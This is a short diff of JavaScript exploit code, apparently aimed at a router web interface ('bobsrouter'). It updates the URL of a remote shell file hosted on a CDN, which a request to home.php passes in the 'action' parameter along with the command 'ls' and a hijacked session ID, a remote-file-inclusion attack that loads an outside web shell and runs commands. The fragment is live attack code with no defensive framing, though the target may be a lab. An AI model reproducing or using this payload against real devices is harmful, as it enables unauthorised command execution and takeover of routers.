@@ -32,7 +32,7 @@ xhr.onreadystatechange = function() {
 			}
 		}
 
-		const SHELL = "https://cdn.jsdelivr.net/gh/dspencer12/bobsrouter@0.23/shell";
+		const SHELL = "https://cdn.jsdelivr.net/gh/dspencer12/bobsrouter@0.27/shell";
 
 		xhr2.open("GET", ROUTER + "/home.php?action=" + encodeURIComponent(SHELL) + "&x=ls&PHPSESSID=" + sessionId, true);
 		xhr2.send('');
